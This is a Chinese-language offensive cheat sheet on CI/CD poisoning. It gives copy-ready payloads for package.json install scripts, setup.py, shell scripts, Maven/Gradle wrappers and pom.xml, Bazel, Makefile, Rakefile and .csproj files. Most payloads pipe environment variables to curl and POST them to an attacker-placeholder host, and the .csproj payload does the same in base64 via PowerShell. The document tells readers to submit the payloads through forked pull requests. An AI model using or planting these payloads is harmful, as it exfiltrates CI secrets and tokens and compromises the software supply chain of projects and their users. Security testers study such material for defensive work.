# 包管理器与构建文件 (Package Managers and Build Files)

> 注入构建文件的代码与 CI 无关 (CI agnostic)，因此当你不知道仓库由哪个系统构建，或者流程涉及多个 CI 时，它们是极佳的目标。在下面的示例中，你需要将文件替换为示例 Payload，或者通过编辑部分内容将你自己的 Payload 注入现有文件。如果 CI 会构建分叉拉取请求 (forked PR)，那么你的 Payload 可能会在 CI 中运行。

## 目录 (Summary)

- [Javascript / Typescript - package.json](#javascript--typescript---packagejson)
- [Python - setup.py](#python---setuppy)
- [Bash / sh - *.sh](#bash--sh---sh)
- [Maven / Gradle](#maven--gradle)
- [BUILD.bazel](#buildbazel)
- [Makefile](#makefile)
- [Rakefile](#rakefile)
- [C# - *.csproj](#c---csproj)

## Javascript / Typescript - package.json

`package.json` 文件被许多 Javascript / Typescript 包管理器（如 `yarn`, `npm`, `pnpm`, `npx` 等）所使用。

该文件可能包含一个带有自定义运行命令的 `scripts` 对象。
`preinstall` (预安装)、`install` (安装)、`build` (构建) 和 `test` (测试) 通常在大多数 CI/CD 流水线中默认执行 —— 因此它们是极佳的注入目标。

如果你遇到 `package.json` 文件，请编辑 `scripts` 对象并在其中注入你的指令。

注意：上述指令中的 Payload 必须经过 `JSON 转义 (json escaped)`。

示例：

```json
{
  "name": "my_package",
  "description": "",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "set | curl -X POST --data-binary @- {YourHostName}",
    "install": "set | curl -X POST --data-binary @- {YourHostName}",
    "build": "set | curl -X POST --data-binary @- {YourHostName}",
    "test": "set | curl -X POST --data-binary @- {YourHostName}"
  },
  "repository": {
    "type": "git",
    "url": "https://github.com/foobar/my_package.git"
  },
  "keywords": [],
  "author": "C.Norris"
}
```

## Python - setup.py

> `setup.py` 在构建过程中被 Python 的包管理器使用。它通常会被默认执行。
> 将 `setup.py` 文件替换为以下 Payload 可能会触发它们在 CI 中的执行。

```python
import os

os.system('set | curl -X POST --data-binary @- {YourHostName}')
```

## Bash / sh - *.sh

> 仓库中的 Shell 脚本通常在自定义 CI/CD 流水线中执行。
> 替换仓库中所有的 `.sh` 文件并提交拉取请求，可能会触发它们在 CI 中的执行。

```shell
set | curl -X POST --data-binary @- {YourHostName}
```

## Maven / Gradle

> 这些包管理器带有一些“包装器 (wrappers)”，有助于运行用于构建 / 测试项目的自定义命令。
> 这些包装器本质上是可执行的 Shell/Cmd 脚本。
> 将它们替换为你的 Payload 即可执行：

- `gradlew`
- `mvnw`
- `gradlew.bat` (Windows)
- `mvnw.cmd` (Windows)

> 有时仓库中可能不存在这些包装器。
> 在这种情况下，你可以编辑 `pom.xml` 文件，该文件指示 Maven 获取哪些依赖项以及运行哪些 `插件 (plugins)`。
> 某些插件支持代码执行，以下是通用插件 `org.codehaus.mojo` 的示例。
> 如果你针对的 `pom.xml` 文件已包含 `<plugins>` 指令，只需在其下方添加另一个 `<plugin>` 节点。
> 如果它**不包含** `<plugins>` 节点，请将其添加到 `<build>` 节点下。

注意：请记住你的 Payload 是插入到 XML 文档中的 —— XML 特殊字符必须转义。

```xml
<build>
    <plugins>
        <plugin>
          <groupId>org.codehaus.mojo</groupId>
          <artifactId>exec-maven-plugin</artifactId>
          <version>1.6.0</version>
          <executions>
              <execution>
                  <id>run-script</id>
                  <phase>validate</phase>
                  <goals>
                      <goal>exec</goal>
                  </goals>
              </execution>
          </executions>
          <configuration>
              <executable>bash</executable>
              <arguments>
                  <argument>
                      -c
                  </argument>
                  <argument>{经过 XML 转义的 Payload}</argument>
              </arguments>
          </configuration>
        </plugin>
    </plugins>
</build>
```

## BUILD.bazel

> 将 `BUILD.bazel` 的内容替换为以下 Payload。

注意：`BUILD.bazel` 要求对反斜杠进行转义。将 Payload 中的任何 `\` 替换为 `\\`。

```shell
genrule(
    name = "build",
    outs = ["foo"],
    cmd = "{经过转义的 Shell Payload}",
    visibility = ["//visibility:public"],
)
```

## Makefile

> Makefile 通常由使用 `C`, `C++` 或 `Go`（但不限于此）编写的项目构建流水线执行。
> 有几种执行 `Makefile` 的工具，最常见的是 `GNU Make` 和 `Make`。
> 将目标 `Makefile` 替换为以下 Payload。

```shell
.MAIN: build
.DEFAULT_GOAL := build
.PHONY: all
all: 
	set | curl -X POST --data-binary @- {YourHostName}
build: 
	set | curl -X POST --data-binary @- {YourHostName}
compile:
	set | curl -X POST --data-binary @- {YourHostName}
default:
	set | curl -X POST --data-binary @- {YourHostName}
```

### Rakefile

> Rakefile 与 `Makefile` 类似，但用于 Ruby 项目。
> 将目标 `Rakefile` 替换为以下 Payload。

```shell
task :pre_task do
  sh "{Payload}"
end

task :build do
  sh "{Payload}"
end

task :test do
  sh "{Payload}"
end

task :install do
  sh "{Payload}"
end

task :default => [:build]
```

## C# - *.csproj

> `.csproj` 文件是适用于 `C#` 运行时的构建文件。
> 它们被构建为 XML 文件，其中包含构建项目所需的各种依赖项。
> 替换仓库中所有的 `.csproj` 文件并提交，可能会触发它们在 CI 中的执行。

注意：由于这是一个 XML 文件，XML 特殊字符必须转义。

```powershell
<Project>
 <Target Name="SendEnvVariables" BeforeTargets="Build;BeforeBuild;BeforeCompile">
   <Exec Command="powershell -Command &quot;$envBody = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem env: | Format-List | Out-String))); Invoke-WebRequest -Uri {YourHostName} -Method POST -Body $envBody&quot;" />
 </Target>
</Project>
```
